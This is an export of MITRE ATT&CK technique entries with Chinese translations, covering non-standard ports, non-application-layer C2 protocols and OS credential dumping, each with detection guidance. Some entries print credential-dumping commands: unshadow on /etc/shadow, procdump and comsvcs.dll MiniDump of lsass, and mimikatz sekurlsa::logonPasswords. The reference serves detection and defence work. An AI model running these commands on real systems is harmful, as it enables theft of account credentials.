Monitor and investigate API calls to functions associated with enabling and/or utilizing alternative communication channels.","Linux, Network, Windows, macOS","Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",False,,,Ryan Becwar,,,,,,,"(Citation: ESET Gelsemium June 2021),(Citation: Cyberreason Anchor December 2019),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: FireEye APT32 May 2017),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Scarlet Mimic Jan 2016),(Citation: Intezer HiddenWasp Map 2019),(Citation: Aquino RARSTONE),(Citation: FireEye APT30),(Citation: CISA WellMail July 2020),(Citation: CheckPoint Naikon May 2020),(Citation: Leonardo Turla Penquin May 2020),(Citation: Talos Cobalt Strike September 2020),(Citation: Fidelis Turbo),(Citation: FoxIT Wocao December 2019),(Citation: Unit 42 NETWIRE April 2020),(Citation: Check Point Warzone Feb 2020),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Kaspersky Turla Penquin December 2014),(Citation: ESET PipeMon May 2020),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: Microsoft PLATINUM June 2017),(Citation: Kaspersky Regin),(Citation: Chronicle Winnti for Linux May 2019),(Citation: Profero APT27 December 2020),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: Gh0stRAT ATT March 2019),(Citation: ESET InvisiMole June 2020),(Citation: JPCert BlackTech Malware September 2019),(Citation: Talos Bisonal Mar 2020),(Citation: Palo Alto MoonWind March 2017),(Citation: Kaspersky QakBot September 2021),(Citation: Symantec Remsec IOCs),(Citation: FireEye FiveHands April 2021),(Citation: Umbreon Trend Micro),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: Dell TG-3390),(Citation: NSA/FBI Drovorub August 2020),(Citation: Proofpoint TA505 October 2019),(Citation: Novetta Winnti April 2015),(Citation: Trend Micro FIN6 October 2019),(Citation: Unit 42 PingPull Jun 2022),(Citation: FireEye Operation Double Tap),(Citation: FireEye Metamorfo Apr 2018),(Citation: Bitdefender Naikon April 2021),(Citation: Microsoft HAFNIUM March 2020),(Citation: ESET Carbon Mar 2017),(Citation: FireEye APT29 Nov 2018),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: Palo Alto Reaver Nov 2017),(Citation: Trend Micro DRBControl February 2020),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: BlackBerry CostaRicto November 2020),(Citation: Mythc Documentation),(Citation: Red Canary NETWIRE January 2020),(Citation: FireEye admin@338),(Citation: CheckPoint Bandook Nov 2020),(Citation: Kaspersky ProjectSauron Full Report),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: Check Point Pay2Key November 2020),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: ESET DazzleSpy Jan 2022),(Citation: Cylance Dust Storm),(Citation: MalwareBytes SideCopy Dec 2021),",非应用层协议,攻击者可能使用非应用层协议在主机和 C2 服务器之间或网络中受感染的主机之间进行通信。可能的协议列表很广泛。（引用：Wikipedia OSI）具体示例包括使用网络层协议，例如 Internet 控制消息协议 (ICMP)，传输层协议，例如用户数据报协议 (UDP)，会话层Socket Secure (SOCKS) 等协议，以及 LAN 上串行 (SOL) 等重定向/隧道协议。主机之间的 ICMP 通信就是一个例子。（引用：Cisco Synful Knock Evolution）因为 ICMP 是 Internet 协议套件的一部分，所以它需要由所有 IP 兼容的主机实现。（引用：Microsoft ICMP）但是，它不是与 TCP 或 UDP 等其他 Internet 协议一样普遍受到监控，并且可能被对手用来隐藏通信。
T1571,Non-Standard Port,"Adversaries may communicate using a protocol and port paring that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.",https://attack.mitre.org/techniques/T1571,14 March 2020,26 March 2020,1.0,Command and Control,"Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.(Citation: University of Birmingham C2)","Linux, Windows, macOS","Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",False,,,,,,,,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Securelist DarkVishnya Dec 2018),(Citation: US-CERT TYPEFRAME June 2018),(Citation: US-CERT BADCALL),(Citation: CISA WellMail July 2020),(Citation: Trustwave GoldenSpy June 2020),(Citation: Fidelis Turbo),(Citation: Symantec Elfin Mar 2019),(Citation: US-CERT HARDRAIN March 2018),(Citation: S2 Grupo TrickBot June 2017),(Citation: FoxIT Wocao December 2019),(Citation: ESET RTM Feb 2017),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Bitdefender Trickbot VNC module Whitepaper 2021),(Citation: Novetta Blockbuster RATs),(Citation: NCSC APT29 July 2020),(Citation: Trend Micro Totbrick Oct 2016),(Citation: NCSC Cyclops Blink February 2022),(Citation: Kaspersky WIRTE November 2021),(Citation: ESET OceanLotus Mar 2019),(Citation: Palo Alto MoonWind March 2017),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: Bitdefender StrongPity June 2020),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: Trend Micro njRAT 2018),(Citation: Talos GravityRAT),(Citation: Anomali Rocke March 2019),(Citation: Talos ZxShell Oct 2014),(Citation: Group IB Silence Sept 2018),(Citation: Unit 42 PingPull Jun 2022),(Citation: FireEye Metamorfo Apr 2018),(Citation: Novetta Blockbuster),(Citation: FireEye TRITON 2019),(Citation: Talos Emotet Jan 2019),(Citation: US-CERT Bankshot Dec 2017),(Citation: Unit42 BendyBear Feb 2021),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: Fidelis TrickBot Oct 2016),(Citation: FireEye FIN7 Aug 2018),(Citation: ESET BlackEnergy Jan 2016),(Citation: ESET DazzleSpy Jan 2022),(Citation: Talos PoetRAT April 2020),",非标准端口,攻击者可以使用通常不相关的协议和端口配对进行通信。例如，HTTPS 通过端口 8088（引用：Symantec Elfin Mar 2019）或端口 587（引用：Fortinet Agent Tesla 2018 年 4 月）而不是传统端口 443。攻击者可能会更改协议使用的标准端口以绕过过滤或混淆网络数据的分析/解析。
T1003,OS Credential Dumping,"Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and access restricted information.

Several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.
",https://attack.mitre.org/techniques/T1003,31 May 2017,08 March 2022,2.1,Credential Access,"### Windows
Monitor for unexpected processes interacting with lsass.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as [Mimikatz](https://attack.mitre.org/software/S0002) access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [Process Injection](https://attack.mitre.org/techniques/T1055) to reduce potential indicators of malicious activity.

Hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well. 

On Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.

Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [Mimikatz](https://attack.mitre.org/software/S0002). [PowerShell](https://attack.mitre.org/techniques/T1059/001) scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module, (Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.

Monitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync. (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) Note: Domain controllers may not log replication requests originating from the default domain controller account. (Citation: Harmj0y DCSync Sept 2015). Also monitor for network protocols  (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft NRPC Dec 2017) and other replication requests (Citation: Microsoft SAMR) from IPs not associated with known domain controllers. (Citation: AdSecurity DCSync Sept 2015)

### Linux
To obtain the passwords and hashes stored in memory, processes must open a maps file in the /proc filesystem for the process being analyzed. This file is stored under the path <code>/proc/<pid>/maps</code>, where the <code><pid></code> directory is the unique pid of the program being interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs.","Linux, Windows, macOS","Active Directory: Active Directory Object Access, Command: Command Execution, File: File Access, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: OS API Execution, Process: Process Access, Process: Process Creation, Windows Registry: Windows Registry Key Access",False,,,"Ed Williams, Trustwave, SpiderLabs; Vincent Le Toux","Administrator, root, SYSTEM",,,,,,"(Citation: FireEye APT40 March 2019),(Citation: Cybereason Cobalt Kitty 2017),(Citation: TrendMicro Tonto Team October 2020),(Citation: Symantec Suckfly May 2016),(Citation: US District Court Indictment GRU Oct 2018),(Citation: BitDefender Chafer May 2020),(Citation: FireEye CARBANAK June 2017),(Citation: Cylance Shaheen Nov 2018),(Citation: Cybereason Oceanlotus May 2017),(Citation: Symantec Dragonfly),(Citation: F-Secure The Dukes),(Citation: ESET Sednit Part 2),(Citation: Novetta-Axiom),(Citation: Kaspersky Poseidon Group),(Citation: FireEye Periscope March 2018),(Citation: Symantec Sowbug Nov 2017),(Citation: DOJ GRU Indictment Jul 2018),(Citation: Microsoft Replication ACL),(Citation: win10_asr),(Citation: TechNet Credential Guard),(Citation: AdSecurity DCSync Sept 2015),(Citation: GitHub SHB Credential Guard),(Citation: Microsoft LSA),(Citation: Microsoft Protected Users Security Group),(Citation: Microsoft Disable NTLM Nov 2012),(Citation: Microsoft WDigest Mit),(Citation: Microsoft Securing Privileged Access)",操作系统凭证转储,攻击者可能会尝试转储凭证以从操作系统和软件中获取帐户登录和凭证材料，通常以散列或明文密码的形式。然后可以使用凭证来执行 [横向移动](https://attack.mitre.org/tactics/TA0008) 并访问受限信息。相关子技术中提到的一些工具可能被对手和专业安全测试人员使用。可能还存在其他自定义工具。
T1003.008,OS Credential Dumping: /etc/passwd and /etc/shadow,"Adversaries may attempt to dump the contents of <code>/etc/passwd</code> and <code>/etc/shadow</code> to enable offline password cracking. Most modern Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code> to store user account information including password hashes in <code>/etc/shadow</code>. By default, <code>/etc/shadow</code> is only readable by the root user.(Citation: Linux Password and Shadow File Formats)

The Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper:(Citation: nixCraft - John the Ripper) <code># /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>
",https://attack.mitre.org/techniques/T1003/008,11 February 2020,20 March 2020,1.0,Credential Access,"The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes attempting to access <code>/etc/passwd</code> and <code>/etc/shadow</code>, alerting on the pid, process name, and arguments of such programs.",Linux,"Command: Command Execution, File: File Access",True,T1003,,,root,,,,,,"(Citation: GitHub LaZagne Dec 2018),",操作系统凭证转储：/etc/passwd 和 /etc/shadow,攻击者可能会尝试转储 <code>/etc/passwd</code> 和 <code>/etc/shadow</code> 的内容以启用离线密码破解。大多数现代 Linux 操作系统使用 <code>/etc/passwd</code> 和 <code>/etc/shadow</code> 的组合来存储用户帐户信息，包括 <code>/etc/shadow</code> 中的密码哈希代码>。默认情况下，<code>/etc/shadow</code> 只能由 root 用户读取。（引用：Linux 密码和影子文件格式）Linux 实用程序 unshadow 可用于以适合的格式组合这两个文件用于密码破解实用程序，例如开膛手约翰：（引用：nixCraft - 开膛手约翰）<code># /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>
T1003.005,OS Credential Dumping: Cached Domain Credentials,"Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.(Citation: Microsoft - Cached Creds)

On Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.(Citation: PassLib mscache) The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to recover the plaintext password.(Citation: ired mscache)

With SYSTEM access, the tools/utilities such as [Mimikatz](https://attack.mitre.org/software/S0002), [Reg](https://attack.mitre.org/software/S0075), and secretsdump.py can be used to extract the cached credentials.

Note: Cached credentials for Windows Vista are derived using PBKDF2.(Citation: PassLib mscache)",https://attack.mitre.org/techniques/T1003/005,21 February 2020,24 March 2020,1.0,Credential Access,"Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.

Detection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well.",Windows,Command: Command Execution,True,T1003,,"Ed Williams, Trustwave, SpiderLabs",SYSTEM,,,,,,"(Citation: GitHub Pupy),(Citation: Unit 42 Playbook Dec 2017),(Citation: FireEye APT35 2018),(Citation: Mandiant APT1),(Citation: Symantec Leafminer July 2018),(Citation: FireEye APT34 July 2019),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: FireEye APT33 Guardrail),(Citation: GitHub LaZagne Dec 2018),(Citation: ESET Okrum July 2019),(Citation: Symantec Elfin Mar 2019),(Citation: Symantec MuddyWater Dec 2018),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: Tilbury Windows Credentials),(Citation: Microsoft Protected Users Security Group)",操作系统凭证转储：缓存域凭证,攻击者可能会尝试访问用于在域控制器不可用时进行身份验证的缓存域凭据。（引用：Microsoft - 缓存凭据）在 Windows Vista 和更高版本上，哈希格式为 DCC2（域缓存凭据版本 2）哈希，也称为 MS-Cache v2 哈希。（引用：PassLib mscache）默认缓存凭据的数量各不相同，并且可以根据系统进行更改。此哈希不允许 pass-the-hash 式攻击，而是需要 [密码破解](https://attack.mitre.org/techniques/T1110/002) 来恢复明文密码。（引用：ired mscache）与SYSTEM 访问权限、工具/实用程序，例如 [Mimikatz](https://attack.mitre.org/software/S0002)、[Reg](https://attack.mitre.org/software/S0075) 和 secretsdump。 py 可用于提取缓存的凭据。注意：Windows Vista 的缓存凭据是使用 PBKDF2 派生的。（引用：PassLib mscache）
T1003.006,OS Credential Dumping: DCSync,"Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller using a technique called DCSync.

Members of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data(Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)(Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098).(Citation: InsiderThreat ChangeNTLM July 2017)

DCSync functionality has been included in the ""lsadump"" module in [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.(Citation: Microsoft NRPC Dec 2017)",https://attack.mitre.org/techniques/T1003/006,11 February 2020,22 April 2021,1.0,Credential Access,"Monitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync.(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) Also monitor for network protocols(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft NRPC Dec 2017) and other replication requests(Citation: Microsoft SAMR) from IPs not associated with known domain controllers.(Citation: AdSecurity DCSync Sept 2015)

Note: Domain controllers may not log replication requests originating from the default domain controller account.(Citation: Harmj0y DCSync Sept 2015)",Windows,"Active Directory: Active Directory Object Access, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1003,,ExtraHop; Vincent Le Toux,Administrator,,,,,,"(Citation: Deply Mimikatz),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Microsoft 365 Defender Solorigate),(Citation: CrowdStrike StellarParticle January 2022),(Citation: TrendMicro EarthLusca 2022),(Citation: Directory Services Internals DPAPI Backup Keys Oct 2015),(Citation: GitHub Mimikatz lsadump Module),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: NCSC Joint Report Public Tools),(Citation: FoxIT Wocao December 2019),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Microsoft Replication ACL),(Citation: ADSecurity Mimikatz DCSync)",操作系统凭证转储：DCSync,攻击者可能会尝试通过滥用 Windows 域控制器的应用程序编程接口 (API) 来访问凭据和其他敏感信息（引用：Microsoft DRSR Dec 2017）（引用：Microsoft GetNCCChanges）（引用：Samba DRSUAPI）（引用：Wine API samlib.dll ) 使用一种称为 DCSync 的技术来模拟远程域控制器的复制过程。域控制器上的管理员、域管理员和企业管理员组或计算机帐户的成员能够运行 DCSync 以从 Active Directory 中提取密码数据（引用：ADSecurity Mimikatz DCSync），其中可能包括潜在有用帐户的当前和历史哈希例如 KRBTGT 和管理员。然后可以使用哈希值来创建 [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) 以用于 [Pass the Ticket](https://attack.mitre.org /techniques/T1550/003）（引文：Harmj0y Mimikatz 和 DCSync）或更改帐户密码，如 [帐户操作]（https://attack.mitre.org/techniques/T1098）中所述。（引文：InsiderThreat ChangeNTLM 2017 年 7 月) DCSync 功能已包含在 [Mimikatz](https://attack.mitre.org/software/S0002) 中的“lsadump”模块中。（引用：GitHub Mimikatz lsadump 模块）Lsadump 还包括 NetSync，它通过旧版复制协议。（引用：Microsoft NRPC 2017 年 12 月）
T1003.004,OS Credential Dumping: LSA Secrets,"Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.(Citation: Passcape LSA Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows Credentials) LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets</code>. LSA secrets can also be dumped from memory.(Citation: ired Dumping LSA Secrets)

[Reg](https://attack.mitre.org/software/S0075) can be used to extract from the Registry. [Mimikatz](https://attack.mitre.org/software/S0002) can be used to extract secrets from memory.(Citation: ired Dumping LSA Secrets)",https://attack.mitre.org/techniques/T1003/004,21 February 2020,21 April 2021,1.0,Credential Access,"Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.",Windows,"Command: Command Execution, Windows Registry: Windows Registry Key Access",True,T1003,,"Ed Williams, Trustwave, SpiderLabs",SYSTEM,,,,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Deply Mimikatz),(Citation: Symantec Elfin Mar 2019),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: CME Github September 2018),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: Impacket Tools),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: GitHub Pupy),(Citation: Unit 42 Playbook Dec 2017),(Citation: TrueSec Gsecdump),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: CrowdStrike IceApple May 2022),(Citation: Github AD-Pentest-Script),(Citation: Dell TG-3390),(Citation: FireEye APT35 2018),(Citation: Directory Services Internals DPAPI Backup Keys Oct 2015),(Citation: FireEye APT33 Guardrail),(Citation: Core Security Impacket),(Citation: GitHub LaZagne Dec 2018),(Citation: AADInternals Documentation),(Citation: NCC Group APT15 Alive and Strong),(Citation: US-CERT TA18-074A),(Citation: Symantec Leafminer July 2018),(Citation: FireEye APT34 July 2019),(Citation: GitHub Mimikatz lsadump Module),(Citation: F-Secure The Dukes),(Citation: NCSC Joint Report Public Tools),(Citation: Symantec MuddyWater Dec 2018),(Citation: Tilbury Windows Credentials)",操作系统凭证转储：LSA 机密,对主机具有 SYSTEM 访问权限的攻击者可能会尝试访问本地安全机构 (LSA) 机密，其中可能包含各种不同的凭据材料，例如服务帐户的凭据。（引用：Passcape LSA 机密）（引用：Microsoft AD Admin Tier模型）（引用：Tilbury Windows 凭据）LSA 机密存储在注册表中的 <code>HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets</code>。 LSA 机密也可以从内存中转储。（引用：ired Dumping LSA Secrets）[Reg]（https://attack.mitre.org/software/S0075）可用于从注册表中提取。 [Mimikatz](https://attack.mitre.org/software/S0002) 可用于从内存中提取秘密。（引用：ired Dumping LSA Secrets）
T1003.001,OS Credential Dumping: LSASS Memory,"Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).

As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.

For example, on the target host use procdump:

* <code>procdump -ma lsass.exe lsass_dump</code>

Locally, mimikatz can be run using:

* <code>sekurlsa::Minidump lsassdump.dmp</code>
* <code>sekurlsa::logonPasswords</code>

Built-in Windows tools such as comsvcs.dll can also be used:

* <code>rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID  lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)


Windows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)

The following SSPs can be used to access credentials:

* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.
* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)
* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.
* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)
",https://attack.mitre.org/techniques/T1003/001,11 February 2020,06 October 2022,1.1,Credential Access,"Monitor for unexpected processes interacting with LSASS.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [Process Injection](https://attack.mitre.org/techniques/T1055) to reduce potential indicators of malicious activity.

On Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.

Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.",Windows,"Command: Command Execution, Process: OS API Execution, Process: Process Access, Process: Process Creation",True,T1003,,"Ed Williams, Trustwave, SpiderLabs; Edward Millington",,,,,,,"(Citation: FoxIT Wocao December 2019),(Citation: Symantec Tick Apr 2016),(Citation: Impacket Tools),(Citation: CISA AA20-301A Kimsuky),(Citation: Symantec Whitefly March 2019),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: ESET Sednit Part 2),(Citation: GitHub PowerSploit May 2012),(Citation: Talos Olympic Destroyer 2018),(Citation: Amplia WCE),(Citation: FireEye APT33 Guardrail),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: FireEye FIN6 April 2016),(Citation: KISA Operation Muzabi),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: FireEye APT34 July 2019),(Citation: GitHub Mimikatz lsadump Module),(Citation: NCSC Joint Report Public Tools),(Citation: Symantec MuddyWater Dec 2018),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: ESET Bad Rabbit),(Citation: Github PowerShell Empire),(Citation: Unit 42 Playbook Dec 2017),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: Cybereason Oceanlotus May 2017),(Citation: DOJ GRU Indictment Jul 2018),(Citation: Directory Services Internals DPAPI Backup Keys Oct 2015),(Citation: GitHub LaZagne Dec 2018),(Citation: ESET Okrum July 2019),(Citation: BiZone Lizar May 2021),(Citation: CERT-FR PYSA April 2020),(Citation: F-Secure CozyDuke),(Citation: PowerSploit Documentation),(Citation: NCC Group APT15 Alive and Strong),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Microsoft PLATINUM April 2016),(Citation: FireEye FIN6 Apr 2019),(Citation: Microsoft NICKEL December 2021),(Citation: Symantec Elfin Mar 2019),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: GitHub Pupy),(Citation: Group IB APT 41 June 2021),(Citation: Symantec Buckeye),(Citation: Cybereason Soft Cell June 2019),(Citation: Talos Nyetya June 2017),(Citation: FireEye APT35 2018),(Citation: Group IB Silence Sept 2018),(Citation: Trend Micro Emotet Jan 2019),(Citation: Volexity Exchange Marauder March 2021),(Citation: ESET Telebots Dec 2016),(Citation: Microsoft HAFNIUM March 2020),(Citation: GitHub PoshC2),(Citation: Threatpost Lizar May 2021),(Citation: Symantec WastedLocker June 2020),(Citation: Symantec Leafminer July 2018),(Citation: Cylance Cleaver),(Citation: Talos PoetRAT April 2020),(Citation: Deply Mimikatz),(Citation: Microsoft GALLIUM December 2019),(Citation: Mandiant APT1),(Citation: US-CERT NotPetya 2017),(Citation: RedCanary Mockingbird May 2020),(Citation: FireEye APT39 Jan 2019),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: FireEye APT40 March 2019),(Citation: TrendMicro EarthLusca 2022),(Citation: FireEye APT41 Aug 2019),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Dell TG-3390),(Citation: Trend Micro Muddy Water March 2021),(Citation: FireEye TRITON 2019),(Citation: ESET Telebots June 2017),(Citation: ESET GreyEnergy Oct 2018),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: win10_asr),(Citation: TechNet Credential Guard),(Citation: GitHub SHB Credential Guard),(Citation: Microsoft LSA),(Citation: Microsoft Disable NTLM Nov 2012),(Citation: Microsoft WDigest Mit)",操作系统凭证转储：LSASS 内存,攻击者可能会尝试访问存储在本地安全机构子系统服务 (LSASS) 的进程内存中的凭证材料。用户登录后，系统会生成各种凭证材料并将其存储在 LSASS 进程内存中。这些凭证材料可以由管理用户或 SYSTEM 获取，并用于使用 [使用备用身份验证材料](https://attack.mitre) 进行 [横向移动](https://attack.mitre.org/tactics/TA0008) .org/techniques/T1550）。与内存技术一样，LSASS 进程内存可以从目标主机转储并在本地系统上进行分析。例如，在目标主机上使用 procdump： * <code>procdump -ma lsass.exe lsass_dump</code> 在本地，mimikatz 可以使用： * <code>sekurlsa::Minidump lsassdump.dmp</code> * < code>sekurlsa::logonPasswords</code> 也可以使用comsvcs.dll等Windows内置工具： * <code>rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp full</代码>（引文：Volexity Exchange Marauder 2021 年 3 月）（引文：赛门铁克对政府部门的攻击）Windows 安全支持提供程序 (SSP) DLL 在系统启动时加载到 LSASS 进程中。一旦加载到 LSA 中，SSP DLL 就可以访问存储在 Windows 中的加密和明文密码，例如任何登录用户的域密码或智能卡 PIN。 SSP 配置存储在两个注册表项中：<code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> 和 <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code >。攻击者可能会修改这些注册表项以添加新的 SSP，这些 SSP 将在下次系统启动时或调用 AddSecurityPackage Windows API 函数时加载。（引用：Graeber 2014）以下 SSP 可用于访问凭据：* Msv：交互式登录、批量登录和服务登录都是通过 MSV 身份验证包完成的。 * Wdigest：摘要身份验证协议设计用于超文本传输协议 (HTTP) 和简单身份验证安全层 (SASL) 交换。（引用：TechNet 博客凭据保护） * Kerberos：首选用于 Windows 2000 中的相互客户端-服务器域身份验证然后。 * CredSSP：为远程桌面服务提供 SSO 和网络级别身份验证。（引用：TechNet 博客凭据保护）
